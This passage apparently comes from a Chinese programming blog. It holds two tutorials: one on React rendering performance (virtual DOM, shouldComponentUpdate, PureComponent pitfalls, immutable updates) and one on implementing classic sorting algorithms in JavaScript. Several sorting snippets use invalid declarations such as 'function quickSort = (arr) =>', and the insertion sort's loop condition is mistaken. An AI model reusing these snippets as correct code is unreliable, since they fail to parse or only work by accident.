PureComponent 有效率 第三題 接著讓我來看一個跟上一題很像的例子，只是這次換成按按鈕以後會改變 list： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Row extends Component &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;&gt; &lt;td&gt;&#123;item.id&#125;&lt;/td&gt; &lt;/tr&gt; ) &#125;&#125; class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table&gt; &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125; &lt;/table&gt; ) &#125;&#125; class App extends Component &#123; state = &#123; list: Array(10000).fill(0).map((val, index) =&gt; (&#123;id: index&#125;)) &#125; handleClick = () =&gt; &#123; this.setState(&#123; list: [...this.state.list, 1234567] // 增加一個元素 &#125;) &#125; render() &#123; const &#123;list&#125; = this.state; return ( &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;change state!&lt;/button&gt; &lt;Table list=&#123;list&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 這時候 Table 的 PureComponent 優化已經沒有用了，因為 list 已經變了，所以會觸發 render function。要繼續優化的話，比較常用的手段是把 Row 變成 PureComponent，這樣就可以確保相同的 Row 不會再次渲染。 123456789101112131415161718192021222324class Row extends PureComponent &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;&gt; &lt;td&gt;&#123;item.id&#125;&lt;/td&gt; &lt;/tr&gt; ) &#125;&#125; class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table&gt; &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125; &lt;/table&gt; ) &#125;&#125; 請問：把 Row 從 Component 換成 PureComponent 之後，如果我們再做一次同樣的操作，也就是按下change state按鈕改變 list，這時候會提升效率嗎？ A. 會，在這情況下 PureComponent 會比 Component 有效率 B. 不會，兩者差不多 C. 不會，在這情況下 Component 會比 PureComponent 有效率 React 的 render 機制 在公布答案之前，先幫大家簡單複習一下 React 是如何把你的畫面渲染出來的。 首先，大家都知道你在render這個 function 裡面可以回傳你想渲染的東西，例如說： 12345class Content extends React.Component &#123; render () &#123; return &lt;div&gt;Content&lt;/div&gt; &#125;&#125; 要注意的是這邊 return 的東西不會直接就放到 DOM 上面去，而是會先經過一層 virtual DOM。其實你可以簡單把這個 virtual DOM 想成 JavaScript 的物件，例如說上面 Content render 出來的結果可能是： 1234&#123; tagName: 'div', children: 'Content'&#125; 最後一步則是 React 進行 virtual DOM diff，把上次的跟這次的做比較，並且把變動的部分更新到真的 DOM 上面去。 簡單來說呢，就是在 React Component 以及 DOM 之間新增了一層 virtual DOM，先把你要渲染的東西轉成 virtual DOM，再把需要更新的東西 update 到真的 DOM 上面去。 如此一來，就能夠減少觸碰到真的 DOM 的次數並且提升性能。 舉個例子，假設我們實作一個非常簡單的，按一個按鈕之後就會改變 state 的小範例： 123456789101112131415161718192021222324class Content extends React.Component &#123; render () &#123; return &lt;div&gt;&#123;this.props.text&#125;&lt;/div&gt; &#125;&#125; class App extends React.Component &#123; state = &#123; text: 'hello' &#125; handleClick = () =&gt; &#123; this.setState(&#123; text: 'world' &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt; &lt;Content text=&#123;this.state.text&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 在程式剛開始執行時，渲染的順序是這樣的： 呼叫 App 的 render 呼叫 Content 的 render 拿到 virtual DOM 跟上次的 virtual DOM 做比較 把改變的地方應用到真的 DOM 這時候的 virtual DOM 整體應該會長得像這樣： 123456789101112&#123; tagName: 'div', children: [ &#123; tagName: 'button', children: 'setState' &#125;, &#123; tagName: 'div', children: 'hello' &#125; ]&#125; 當你按下按鈕，改變 state 了以後，執行順序都跟剛剛一樣： 呼叫 App 的 render 呼叫 Content 的 render 拿到 virtual DOM 這時候拿到的 virtual DOM 應該會長得像這樣： 123456789101112&#123; tagName: 'div', children: [ &#123; tagName: 'button', children: 'setState' &#125;, &#123; tagName: 'div', children: 'world' // 只有這邊變了 &#125; ]&#125; 而 React 的 virtual DOM diff 演算法，就會發現只有一個地方改變，然後把那邊的文字替換掉，其他部分都不會動到。 其實官方文件把這一段寫得很好： When you use React, at a single point in time you can think of the render() function as creating a tree of React elements. On the next state or props update, that render() function will return a different tree of React elements. React then needs to figure out how to efficiently update the UI to match the most recent tree. 大意就是你可以想像成 render function 會回傳一個 React elements 的 tree，然後 React 會把這次的 tree 跟上次的做比較，並且找出如何有效率地把這差異 update 到 UI 上面去。 所以說呢，如果你要成功更新畫面，你必須經過兩個步驟： render function virtual DOM diff 因此，要優化效能的話你有兩個方向，那就是： 不要觸發 render function 保持 virtual DOM 的一致 我們先從後者開始吧！ 提升 React 效能：保持 virtual DOM 的一致 因為有了 virtual DOM 這一層的守護，通常你不必太擔心 React 的效能。 像是我們開頭問答的第一題： 12345678910111213141516171819202122232425262728class Content extends React.Component &#123; render () &#123; console.log('render content!'); return &lt;div&gt;Content&lt;/div&gt; &#125;&#125; class App extends React.Component &#123; handleClick = () =&gt; &#123; this.setState(&#123; a: 1 &#125;) &#125; render() &#123; console.log('render App!'); return ( &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt; &lt;Content /&gt; &lt;/div&gt; ); &#125;&#125; ReactDOM.render( &lt;App /&gt;, document.getElementById('container')); 你每次按下按鈕之後，由於 App 的 state 改變了，所以會先觸發 App 的 render function，而因為裡面有回傳&lt;Content /&gt;，所以也會觸發 Content 的 render function。 因此你每按一次按鈕，這兩個 component 的 render function 就會個別被呼叫一次。所以答案是C. render App! 以及 render content!（兩者的 render function 都被執行到） 可是儘管如此，真的 DOM 不會有任何變化。因為在 virtual DOM diff 的時候，React 會發現你這次跟上次的 virtual DOM 長得一模一樣（因為沒有東西改變嘛），就不會對 DOM 做任何操作。 如果能盡量維持 virtual DOM 的結構相似的話，可以減少一些不必要的操作，在這點上其實可以做的優化還很多，可以參考官方文件，裡面寫的很詳細。 提升 React 效能：不要觸發 render function 雖然不必太過擔心，但是 virtual DOM diff 也是需要執行時間的。雖然說速度很快，但再快也比不上完全不呼叫來的快，你說是吧。 對於這種「我們已經明確知道不該有變化」的情形，我們連 render 都不該呼叫，因為沒必要嘛，再怎麼呼叫都是一樣的結果。如果 render 沒有被呼叫的話，連 virtual DOM diff 都不需要執行，又提升了一些性能。 你應該有聽過shouldComponentUpdate這個 function，就是來做這件事的。如果你在這個 function 中回傳 false，就不會重新呼叫 render function。 1234567891011121314151617181920212223242526class Content extends React.Component &#123; shouldComponentUpdate () &#123; return false; &#125; render () &#123; console.log('render content!'); return &lt;div&gt;Content&lt;/div&gt; &#125;&#125; class App extends React.Component &#123; handleClick = () =&gt; &#123; this.setState(&#123; a: 1 &#125;) &#125; render() &#123; console.log('render App!'); return ( &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt; &lt;Content /&gt; &lt;/div&gt; ); &#125;&#125; 加上去之後，你會發現無論你按多次按鈕，Content 的 render function 都不會被觸發。 但是這個東西請小心使用，一個不注意你就會碰到 state 跟 UI 搭不上的情形，例如說 state 明明變成 world，可是 UI 顯示的還是 Hello： 12345678910111213141516171819202122232425262728class Content extends React.Component &#123; shouldComponentUpdate()&#123; return false; &#125; render () &#123; return &lt;div&gt;&#123;this.props.text&#125;&lt;/div&gt; &#125;&#125; class App extends React.Component &#123; state = &#123; text: 'hello' &#125; handleClick = () =&gt; &#123; this.setState(&#123; text: 'world' &#125;) &#125; render() &#123; return ( &lt;div&gt; &lt;button onClick=&#123;this.handleClick&#125;&gt;setState&lt;/button&gt; &lt;Content text=&#123;this.state.text&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 在上面的例子中，按下按鈕之後 state 確實變成world，但是因為 Content 的shouldComponentUpdate永遠都回傳 false，所以不會再次觸發 render，就看不到對應的新的 state 的畫面了。 不過這有點極端，因為通常不會永遠都回傳 false，除非你真的確定這個 component 完全不需要 re-render。 比起這個，有一個更合理的判斷基準是： 如果每一個 props 跟 state 都沒有變，那就回傳 false 123456789class Content extends React.Component &#123; shouldComponentUpdate(nextProps, nextState)&#123; return !shallowEqual(this.props, nextProps) || !shallowEqual(this.state, nextState); &#125; render () &#123; return &lt;div&gt;&#123;this.props.text&#125;&lt;/div&gt; &#125;&#125; 假設this.props是： 123&#123; text: 'hello'&#125; 而nextProps是： 123&#123; text: 'world'&#125; 那在比較的時候就會發現props.text變了，就可以順理成章的呼叫 render function。還有另外一點是這邊用shallowEqual來比較前後的差異，而不是用deepEqual。 這是出於效能上的考量。別忘了，你要執行這樣的比較也是會吃資源的，尤其是在你的 object 很深很深的時候，要比較的東西可就多了，因此我們會傾向用shallowEqual，只要比較一層即可。 另外，前面有提到PureComponent這個東西，其實就是 React 提供的另外一種元件，差別就是在於它自動幫你加上上面那一段的比較。如果你想看原始碼的話，在這邊： 12345if (type.prototype &amp;&amp; type.prototype.isPureReactComponent) &#123; return ( !shallowEqual(oldProps, newProps) || !shallowEqual(oldState, newState) );&#125; 講到這邊，就可以來公佈第二題的解答了，答案是：A. 會，在這情況下 PureComponent 會比 Component 有效率，因為繼承了 PureComponent 之後，只要 props 跟 state 沒變，就不會執行 render function，也不會執行 virtual DOM diff，節省了許多開銷。 shallowEqual 與 Immutable data structures 你剛開始在學 React 的時候，可能會被告誡說如果要更改資料，不能夠這樣寫： 12345678910111213// 不能這樣const newObject = this.state.objnewObject.id = 2;this.setState(&#123; obj: newObject&#125;) // 也不能這樣const arr = this.state.arr;arr.push(123);this.setState(&#123; list: arr&#125;) 而是應該要這樣： 12345678910this.setState(&#123; obj: &#123; ...this.state.obj, id: 2 &#125;&#125;) this.setState(&#123; list: [...this.state.arr, 123]&#125;) 但你知道為什麼嗎？ 這個就跟我們上面講到的東西有關了。如同上面所述，其實使用PureComponent是一件很正常的事情，因為 state 跟 props 如果沒變的話，本來就不該觸發 render function。 而剛剛也提過PureComponent會幫你shallowEqual state 跟 props，決定要不要呼叫 render function。 在這種情況下，如果你用了一開始講的那種寫法，就會產生問題，例如說： 12345const newObject = this.state.objnewObject.id = 2;this.setState(&#123; obj: newObject&#125;) 在上面的程式碼中，其實this.state.obj跟newObject還是指向同一個物件，指向同一塊記憶體，所以當我們在做shallowEqual的時候，就會判斷出這兩個東西是相等的，就不會執行 render function 了。 在這時候，我們就需要 Immutable data，Immutable 翻成中文就是永遠不變的，意思就是：「當一個資料被創建之後，就永遠不會變了」。那如果我需要更改資料的話怎麼辦呢？你就只能創一個新的。 123456789101112const obj = &#123; id: 1, text: 'hello'&#125; obj.text = 'world' // 這樣不行，因為你改變了 obj 這個物件 // 你必須要像這樣創造一個新的物件const newObj = &#123; ...obj, text: 'world'&#125; 有了 Immutable 的概念之後，shallowEqual就不會出錯了，因為如果我們有新的資料，就可以保證它是一個新的 object，這也是為什麼我們在用setState的時候總是要產生一個新的物件，而不是直接對現有的做操作。 123456789101112131415161718192021222324252627// 沒有 Immutable 的概念前 const props = &#123; id: 1, list: [1, 2, 3]&#125; const list = props.list;list.push(4)nextProps = &#123; ...props, list&#125; props.list === nextProps.list // true // 有了 Immutable 的概念後const props = &#123; id: 1, list: [1, 2, 3]&#125; const nextProps = &#123; ...props, list: [...props.list, 4]&#125; props.list === nextProps.list // false 這邊還有一個要注意的地方，那就是 spread operator 只會複製第一層的資料而已，它並不是 deep clone： 12345678910const test = &#123; a: 1, nest: &#123; title: 'hello' &#125;&#125; const copy = &#123;...test&#125; copy.nest === test.nest // true 所以當你的 state 是比較複雜的結構時，要改變資料就會變得比較麻煩一點，因為你必須要對每一層都做差不多的事情，避免直接去改到你要改的物件： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354// 沒有 Immutable 的概念前 const props = &#123; title: '123', list: [ &#123; id: 1, name: 'hello' &#125;, &#123; id: 2, name: 'world' &#125; ]&#125; const list = props.list;list[1].name = 'world2'; // 直接改nextProps = &#123; ...props, list&#125; props.list === nextProps.list // trueprops.list[1] === nextProps.list[1] // true // 有了 Immutable 的概念後const props = &#123; title: '123', list: [ &#123; id: 1, name: 'hello' &#125;, &#123; id: 2, name: 'world' &#125; ]&#125; // 要注意這邊只是 shallow copy 而已// list[0] === props.list[0] =&gt; trueconst list = [...props.list.slice(0, 1)]const data = props.list[1]; const nextProps = &#123; ...props, list: [...list, &#123; ...data, // 再做一次 spread oprator name: 'world2' &#125;]&#125; props.list === nextProps.list // falseprops.list[0] === nextProps.list[0] // trueprops.list[1] === nextProps.list[1] // false 若你的 state 結構很多層，那就會變得非常非常難改，這時候你有三個選擇： 避免這麼多層的 state，盡量壓平（可參考normalizr） 找一個會幫你做 Immutable 的 library，例如說 Facebook 的 Immutable.js 直接用 deep clone 把資料全部複製下來，之後你愛怎麼改就怎麼改（不推薦） 註：感謝網友 KanYueh Chen 的指正，讓我補上上面這一段。 PureComponent 的陷阱 當我們遵守 Immutable 的規則之後，理所當然的就會想把所有的 Component 都設成 PureComponent，因為 PureComponent 的預設很合理嘛，資料沒變的話就不呼叫 render function，可以節省很多不必要的比較。 那讓我們回頭來看開場小測驗的最後一題： 123456789101112131415161718192021222324class Row extends PureComponent &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;&gt; &lt;td&gt;&#123;item.id&#125;&lt;/td&gt; &lt;/tr&gt; ) &#125;&#125; class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table&gt; &#123;list.map(item =&gt; &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; /&gt;)&#125; &lt;/table&gt; ) &#125;&#125; 我們把Row變成了 PureComponent，所以只要 state 跟 props 沒變，就不會 re-render，所以答案應該要是A. 會，在這情況下 PureComponent 會比 Component 有效率？ 錯，如果你把程式碼看更清楚一點，你會發現答案其實是C. 不會，在這情況下 Component 會比 PureComponent 有效率。 你的前提是對的，「只要 state 跟 props 沒變，就不會 re-render，PureComponent 就會比 Component 更有效率」。但其實還有另外一句話也是對的：「如果你的 state 或 props 『永遠都會變』，那 PureComponent 並不會比較快」。 所以這兩種的使用時機差異在於：state 跟 props 到底常常會變還是不會變？ 上述的例子中，陷阱在於itemStyle這個 props，我們每次 render 的時候都創建了一個新的物件，所以對 Row 來說，儘管 props.item 是一樣的，但是 props.style 卻是「每次都不一樣」。 如果你已經知道每次都會不一樣，那 PureComponent 這時候就無用武之地了，而且還更糟。為什麼？因為它幫你做了shallowEqual。 別忘記了，shallowEqual也是需要執行時間的。 已經知道 props 的比較每次都失敗的話，那不如不要比還會來的比較快，所以在這個情形下，Component 會比 PureComponent 有效率，因為不用做shallowEqual。 這就是我開頭提到的需要特別注意的部分。不要以為你把每個 Component 都換成 PureComponent 就天下太平，App 變超快，效能提升好幾倍。不去注意這些細節的話，就有可能把效能越弄越糟。 最後再強調一次，如果你已經預期到某個 component 的 props 或是 state 會「很頻繁變動」，那你根本不用換成 PureComponent，因為你實作之後反而會變得更慢。 總結 在研究這些效能相關的問題時，我最推薦這篇：React, Inline Functions, and Performance，解開了很多我心中的疑惑以及帶給我很多新的想法。 例如說文末提到的 PureComponent 有時候反而會變慢，也是從這篇文章看來的，真心推薦大家抽空去看看。 前陣子跟同事一起把一個專案打掉重做，原本的共識是盡量用 PureComponent，直到我看到這篇文並且仔細思考了一下，發現如果你不知道背後的原理，還是不要輕易使用比較好。因此我就提議改成全部用 Component，等我們碰到效能問題要來優化時再慢慢調整。 最後附上一句我很喜歡的話，從React 巢狀 Component 效能優化這篇看來的（這篇也是在講最後提到的 PureComponent 的問題）： 雖然你知道可以優化，但不代表你應該優化。 參考資料： High Performance React: 3 New Tools to Speed Up Your Apps reactjs - Reconciliation reactjs- Optimizing Performance React is Slow, React is Fast: Optimizing React Apps in Practice Efficient React Components: A Guide to Optimizing React Performance","link":"/2018/01/15/react-performance-immutable-and-scu/"},{"title":"一起用 JavaScript 來複習經典排序法吧！","text":"前言 最近剛好上到 CS50 Week3，這一週的主題是：Algorithms，裡面介紹到了幾種經典的排序法，像是選擇排序、泡沫排序、插入排序以及合併排序。 我覺得身為一個軟體工程師，大概一輩子都脫離不了排序了，畢竟這是經典演算法之一嘛！與其每次要面試之前都凌亂的準備，不如現在就整理出一篇，紀錄一下各個排序法的心得，幫自己做個統整。 因此，這一篇將利用 JavaScript 來實作各個經典排序演算法。 這次實做的排序法都會是由小到大排序，並且為了方便起見，每一個排序法「都會直接更改原本的 array」，但如果你不想改到原本的也很簡單，在每一個的函式最開頭加上：arr = arr.slice()複製一份原本的即可。 還有，因為文章裡面比較難放動畫，所以我只能放一些圖片而已，若是想搭配視覺化演算法一起學習的話，我非常推薦 VISUALGO，這網站絕對會讓你對排序的理解度更上一層樓。 選擇排序法（Selection Sort） 選擇排序是我認為最好理解的排序法，因為它的原理超級簡單： 找到最小值，移到最左邊。 當你第一輪跑完之後，你就找到整個陣列的最小值了，然後你把尋找範圍從 0 ~ n-1 變成 1 ~ n-1，重複做一樣的事情就可以了。或是，你也可以想成是：找到最小值，第二小值，第三小值…第 n 小值。 （圖片來源：http://cheetahonfire.blogspot.sg/2009/05/selection-sort-vs-insertion-sort.html ） 123456789101112131415161718192021222324const selectionSort = (arr) =&gt; &#123; const length = arr.length; // 有幾個元素，就要找幾輪的最小值 // 這邊的 i 代表 i 以前的元素都排序好了 for (let i = 0; i &lt; length; i++) &#123; // 先預設第一個是最小的 let min = arr[i]; let minIndex = i; // 從還沒排好的元素開始找最小值 for (let j = i; j &lt; length; j++) &#123; if (arr[j] &lt; min) &#123; min = arr[j]; minIndex = j; &#125; &#125; // ES6 的用法，交換兩個數值 [arr[minIndex], arr[i]] = [arr[i], arr[minIndex]]; &#125; return arr;&#125; 時間複雜度就是大家所熟知的 O(n^2)，最好、最壞、平均都是一樣的，因為無論原本的陣列長怎樣，都要經過這麼多輪比較。 泡沫排序法（Bubble Sort） 泡沫排序應該是很多人第一個接觸的排序法，原理也很簡單好懂： 跟隔壁互相比較，順序錯了就交換，讓大的元素一直浮到最後 就是這樣交換的過程，才讓它稱為「泡沫」排序法，因為元素很像「浮」了上來。 （圖片來源：http://www.opentechguides.com/how-to/article/c/51/bubble-sort-c.html ） 123456789101112131415161718const bubbleSort = (arr) =&gt; &#123; const n = arr.length; // 一共要跑 n 輪 for (let i = 0; i &lt; n; i++) &#123; // 從第一個元素開始，不斷跑到第 n - 1 - i 個 // 原本是 n - 1，會再加上 - i 是因為最後 i 個元素已經排好了 // 所以沒必要跟那些排好的元素比較 for (let j = 0; j &lt; n - 1 - i; j++) &#123; if (arr[j] &gt; arr[j + 1]) &#123; [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]]; &#125; &#125; &#125; return arr;&#125; 雖然泡沫排序法的平均跟最壞時間複雜度都是O(n^2)，但值得注意的是 best case，出現在輸入的陣列已經是排序好的情況下。在這種情況下呢，時間複雜度是 O(n)，不會做任何的交換。 但是呢，如果你要做到最優的情形是 O(n)，你必須要加上一個小優化才行。不然以我們上面的情況，雖然不會做任何交換，但還是會把每一個元素都 check 一遍。 可以加上一個 flag 標注內圈有沒有交換的情形發生，如果沒有，就代表陣列已經排序好了，就可以直接跳掉。 1234567891011121314151617181920function optimzedBubbleSort = (arr) =&gt; &#123; const n = arr.length; let swapped = true; // 一共要跑 n 輪 for (let i = 0; i &lt; n &amp;&amp; swapped; i++) &#123; // 從第一個元素開始，不斷跑到第 n - 1 - i 個 // 原本是 n - 1，會再加上 - i 是因為最後 i 個元素已經排好了 // 所以沒必要跟那些排好的元素比較 swapped = false; for (let j = 0; j &lt; n - 1 - i; j++) &#123; if (arr[j] &gt; arr[j + 1]) &#123; swapped = true; [arr[j], arr[j + 1]] = [arr[j + 1], arr[j]]; &#125; &#125; &#125; return arr;&#125; 改良之後，如果輸入是已經排好的陣列，就只會跑一次內圈，然後就跳掉了，所以時間複雜度會是O(n)。 插入排序法（Insertion Sort） 插入排序法是我認為相當直覺的一個排序法，簡單來說就是： 你玩撲克牌的時候會用到的排序法 就是不斷把撲克牌插入到適合的位置嘛，只是你玩牌的時候可能一次插入好多牌，而插入排序法是一次插入一張牌。 （圖片來源：https://commons.wikimedia.org/wiki/File:Insertion-sort-example.gif ） 這邊比較值得注意的是在插入時候的演算法，不斷往前找到適合的位置，並且在邊找的時候就邊挪動元素了，所以等找到的時候就可以直接插入。 123456789101112131415161718192021222324const insertionSort = (arr) =&gt; &#123; const n = arr.length; // 假設第一個元素已經排好，所以從 1 開始跑 for (let i = 1; i &lt; n; i++) &#123; // position 表示可以插入的位置 let position = i; // 先把要插入的元素存起來 const value = arr[i]; // 開始往前找，只要符合這條件就代表這個位置是可以插入的 // 邊找的時候就可以邊把元素往後挪，騰出空間 while (i &gt;= 0 &amp;&amp; arr[position - 1] &gt; value) &#123; [arr[position], arr[position - 1]] = [arr[position - 1], arr[position]]; position--; &#125; // 找到適合的位置，放入元素 arr[position] = value; &#125; return arr;&#125; 插入排序法的最佳情形出現在輸入元素已經是排序好的情況，這時候裡面的while只要跑一次就會結束了，所以時間複雜到就是外圈的O(n)而已。 這邊提一個小插曲，我當初在寫示範跟測試的程式碼的時候沒寫好，導致拿來測試的陣列都是已經排好的，我就想說：「怎麼插入排序法比快速排序法還快，不合理啊！」 合併排序法（Merge Sort） 接著要進入到比較快的排序法了，合併排序法算是滿好理解的一個： 切一半，排好左邊，排好右邊，合併 談合併排序法的時候我喜歡先談合併這個步驟，其實就是把兩個各自排序好的陣列合併成一個。這一步其實也滿簡單，因為兩邊都已經排序好了嘛，所以就是不斷看兩邊的第一個元素，誰小就抓誰下來，接著左邊抓完就抓右邊，反之亦然。 （圖片來源：http://www.java2novice.com/java-sorting-algorithms/merge-sort/ ） 我自己之前在看合併排序的時候，發現可以寫成一個比較好懂，但是空間耗費比較多的版本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950const simpleMergeSort = (arr) =&gt; &#123; // 合併 const merge = (leftArray, rightArray) =&gt; &#123; let result = []; let nowIndex = 0, left = 0, right = 0; const leftLength = leftArray.length; const rightLength = rightArray.length; // 如果左右兩邊都沒抓完，就看誰比較小抓誰 while (left &lt; leftLength &amp;&amp; right &lt; rightLength) &#123; if (leftArray[left] &lt; rightArray[right]) &#123; result[nowIndex++] = leftArray[left++]; &#125; else &#123; result[nowIndex++] = rightArray[right++]; &#125; &#125; // 跑到這裡代表左右兩邊其中一邊抓完了 // 如果是左邊沒抓完，全部抓下來 while (left &lt; leftLength) &#123; result[nowIndex++] = leftArray[left++]; &#125; // 右邊沒抓完，全部抓下來 while (right &lt; rightLength) &#123; result[nowIndex++] = rightArray[right++]; &#125; // 把合併好的陣列直接傳回去 return result; &#125; const _mergeSort = (arr) =&gt; &#123; const length = arr.length; if (length &lt;= 1) return arr; // 切兩半 const middle = Math.floor(length / 2); // 排左邊 const leftArray = _mergeSort(arr.slice(0, middle)); // 排右邊 const rightArray = _mergeSort(arr.slice(middle, length)); // 合併後丟回去 return merge(leftArray, rightArray); &#125; return _mergeSort(arr);&#125; 對我來說，比較簡單的理由是滿直覺的，你就直接用 slice 切成兩個陣列，排序好之後合併起來就好。 但比較省空間的做法是直接更改原來的陣列就好，這時候我們的參數會變得不太一樣： 123456789101112131415161718192021222324252627282930313233343536373839404142434445function mergeSort = (arr) =&gt; &#123; const merge = (array, start, middle, end) =&gt; &#123; // 宣告一個暫時的陣列來放合併後的結果 let temp = []; let nowIndex = 0; let left = start; let right = middle + 1; // 這邊都跟上面一樣 while (left &lt;= middle &amp;&amp; right &lt;= end) &#123; if (array[left] &lt; array[right]) &#123; temp[nowIndex++] = array[left++]; &#125; else &#123; temp[nowIndex++] = array[right++]; &#125; &#125; while (left &lt;= middle) &#123; temp[nowIndex++] = array[left++]; &#125; while (right &lt;= end) &#123; temp[nowIndex++] = array[right++]; &#125; // 要把合併後的陣列放回去 array[start ~ end] for (let i = start; i &lt;= end; i++) &#123; array[i] = temp[i - start]; &#125; &#125; // 代表要從 start 排到 end const _mergeSort = (array, start, end) =&gt; &#123; if (end &lt;= start) return; const middle = Math.floor((start + end) / 2); // 對左右兩半排序 _mergeSort(array, start, middle); _mergeSort(array, middle + 1, end); merge(array, start, middle, end); return array; &#125; return _mergeSort(arr, 0, arr.length - 1);&#125; 因為是直接更改原本的陣列，所以要多傳幾個數字進去，代表我要排序這個陣列的那一段。而呼叫完之後，你就可以預設這一段的陣列已經是排序好的了。 基本上流程都跟上面簡單版的沒兩樣，但省了一些記憶體空間。 快速排序法（Quick Sort） 快速排序法我一開始覺得滿複雜，知道原理之後就覺得沒那麼難了，其實原理滿簡單： 找一個數，並且把這個數調整到：讓左邊的元素比它小，右邊的元素比它大，再對左右兩遍做一樣的事 那個數我們稱作 pivot，會把數列分割成左右兩邊。 例如說現在有一個數列是：14, 7, 6, 9, 10, 20, 15 我們挑選 14 當作 pivot，調整過後變成：7, 6, 9 , 10, 14, 20, 15，左邊都比它小，右邊都比它大。 而當你把 14 調整好的時候，其實這個元素就排好了！因為左邊比它小，右邊比它大嘛，所以這一個數字就排好了。接著只要對左右兩邊還沒排好的也做快速排序就行了。 而快速排序的核心在於你要怎麼找到那個數，如果你找的數字剛好是數列的中位數，那當然效率最高。如果找的是最小的數，那就是最壞的情形，時間複雜度就變成O(n^2)，有分割跟沒分割一樣。 我們直接假設第一個數就是 pivot，這樣比較方便。 那再來有一個問題是，要怎麼把這個數字調整到左邊比它小，右邊比它大呢？我們可以維護一個變數叫做 splitIndex，讓這個 index 左邊的元素都比 pivot 小，而這個 index 本身以及它右邊的元素都比 pivot 大。 當你掃一遍陣列，發現某個元素比 pivot 小的時候，就把這個元素跟 splitIndex 上的元素交換，並且把 splitIndex + 1，就可以做到我們上面想做的事情了。最後記得把 pivot 跟 splitIndex - 1（也就是最後一個比它小的元素）交換，就能夠把 pivot 放到正確的位置上了。 可以參考下面的 gif，或是直接去VISUALGO看看。 （來源：https://github.com/hustcc/JS-Sorting-Algorithm/blob/master/6.quickSort.md ） 12345678910111213141516171819202122232425262728function quickSort = (arr) =&gt; &#123; const swap = (array, i , j) =&gt; &#123; [array[i], array[j]] = [array[j], array[i]]; &#125; const partition = (array, start, end) =&gt; &#123; let splitIndex = start + 1; for (let i = start + 1; i &lt;= end; i++) &#123; if (array[i] &lt; array[start]) &#123; swap(array, i, splitIndex); splitIndex++; &#125; &#125; // 記得把 pivot 跟最後一個比它小的元素互換 swap(array, start, splitIndex - 1); return splitIndex - 1; &#125; const _quickSort = (array, start, end) =&gt; &#123; if (start &gt;= end) return array; // 在 partition 裡面調整數列，並且回傳 pivot 的 index const middle = partition(array, start, end); _quickSort(array, start, middle - 1); _quickSort(array, middle + 1, end); return array; &#125;; return _quickSort(arr, 0, arr.length - 1);&#125; 堆排序（Heap Sort） Heap 是一種資料結構，並且有分兩種：max heap 跟 min heap，兩種的原理其實雷同，我們直接拿 max heap 來講。 先讓大家看一張 max heap 的圖片： （資料來源：https://www.tutorialspoint.com/data_structures_algorithms/heap_data_structure.htm ） 大家可以發現，max heap 滿足了兩個性質： 父節點一定大於子節點 整個樹的根節點一定是最大值（可以由 1 推出來） 而要用陣列表示 heap 也很簡單，會像這樣： （資料來源：http://notepad.yehyeh.net/Content/Algorithm/Sort/Heap/Heap.php ） 所以 heap sort 就是利用這個資料結構做排序，流程很簡單： 先把讀進來的陣列建成 max heap（這時候 arr[0] 一定是這陣列最大值） 把 arr[0] 跟最後一個節點互換（其實是最後一個還沒排序過的節點） 調整成 max heap，回到步驟 2 heap sort 其實有點複雜，複雜到可以再獨立出來一篇了… 但簡單來說呢，就是改良版的選擇排序法，每一次都選最大值出來，然後把剩下的數字再調整成 max heap。 123456789101112131415161718192021222324252627282930313233343536373839function heapSort = (arr) =&gt; &#123; function heapify(arr, length, node) &#123; const left = node * 2 + 1; const right = node * 2 + 2; // 先預設最大的節點是自己 let max = node; if (left &lt; length &amp;&amp; arr[left] &gt; arr[max]) &#123; max = left; &#125; if (right &lt; length &amp;&amp; arr[right] &gt; arr[max]) &#123; max = right; &#125; // 如果左右兩邊有任何一個比 node 大的話 if (max !== node) &#123; // 就把兩個互換 [arr[node], arr[max]] = [arr[max], arr[node]]; // 接著繼續 heapfiy heapify(arr, length, max); &#125; &#125; // build max heap const length = arr.length; for (let i = Math.floor(length / 2) - 1; i&gt;=0; i--) &#123; heapify(arr, length, i); &#125; // 排序 for (let i = length - 1; i &gt; 0; i--) &#123; [arr[0], arr[i]] = [arr[i], arr[0]]; heapify(arr, i, 0); &#125; return arr;&#125; 總結 其實仔細研究過後，就會發現每一個排序演算法都有值得參考的地方，而且每個排序法都滿有趣的。也會發現懂原理是一回事，寫不寫的出來又是另外一回事了。這篇就當作自己的排序法筆記吧，如果有任何錯誤麻煩不吝指出。 如果想要自己玩玩看的話，我有放到 Github 上，有寫好 testcase，改一改就可以直接測了，應該滿方便的。 因為要測試的關係，所以每個排序法前面都會加上：arr = arr.slice()避免修改到原本的 array。 測試的過程也滿有趣的，我發現有些 ES6 語法（例如說很潮的交換語法或甚至是let）有時候會拖慢執行速度，因此我之前有把語法全部改回 ES5，發現效率快了不少，但這篇因為重點不在效能，所以還是全部用 ES6 的語法。 參考資料 [演算法] 堆積排序法(Heap Sort) 常见排序算法 - 堆排序 (Heap Sort) 排序之堆積排序法(Heap Sort) js算法:heap sort 使用堆排序 